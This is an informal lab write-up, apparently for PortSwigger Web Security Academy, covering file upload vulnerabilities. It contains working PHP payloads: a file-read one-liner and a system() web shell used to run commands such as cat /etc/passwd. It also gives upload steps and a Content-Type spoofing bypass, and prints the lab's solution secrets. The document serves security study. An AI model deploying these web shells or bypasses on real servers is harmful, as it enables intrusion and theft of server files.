# file upload vulnerabilities

````php
<?php echo file_get_contents('/path/to/target/file'); ?>
``` change suit content-type: image/jpeg then inspect append/view img in new tab

```php
<?php echo system($_GET['cmd']); ?>
``` in website shell.php(contain this) shell.php?cmd=cat+/etc/passwd 

worst possible scenario is when a website allows you to upload server-side scripts, such as PHP, Java, or Python files, and is also configured to execute them as code.

or example, the following PHP one-liner could be used to read arbitrary files from the server's filesystem:

```php
<?php echo file_get_contents('/path/to/target/file'); ?>
````

Once uploaded, sending a request for this malicious file will return the target file's contents in the response.

A more versatile web shell may look something like this:

```php
<?php echo system($_GET['cmd']); ?>
```

This script enables you to pass an arbitrary system command via a query parameter as follows:
GET /example/exploit.php?command=id HTTP/1.1

## (Remote code execution via web shell upload)

1.login account u saw u can upload a file u upload brup.php that contain

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

<img width="749" height="739" alt="image" src="https://github.com/user-attachments/assets/9e122425-f680-402c-8e08-429e09d3ff53" />

2.then u uploaded but it does not display at the avatar so inspect the avatar so we can check the result from the avatar

<img width="747" height="543" alt="image" src="https://github.com/user-attachments/assets/c5eff708-4ea9-4dee-bfbc-157bb2d74760" />
it show src="/files/avatars/brup.php"  so we append to the website or view image in new tab

[https://YOUR-LAB-ID.web-security-academy.net](https://YOUR-LAB-ID.web-security-academy.net)        /files/avatars/brup.php
solved!

<img width="684" height="184" alt="image" src="https://github.com/user-attachments/assets/9d7c9fd9-755c-4b49-aaf2-1a744515295f" />

qI2RxNp24Ki03oAbSoeQ9IOBFi38hMO8

## (Web shell upload via Content-Type restriction bypass)

this is similar since it does not accept .php only jpeg

<img width="704" height="221" alt="image" src="https://github.com/user-attachments/assets/43474c4f-b75b-40b8-8454-68512a1a1b8d" />
just change the content-type when intercept from application/x-php -> image/jpeg

<img width="528" height="349" alt="image" src="https://github.com/user-attachments/assets/88aaad1d-66a9-4f9e-b4be-6d3313aba2f3" />

<img width="735" height="264" alt="image" src="https://github.com/user-attachments/assets/541bc340-0775-49f4-945c-f83f96eb8b36" />
RDk0PI0DIfMHX8W31YjzuhXfrWOv2p4u solved!
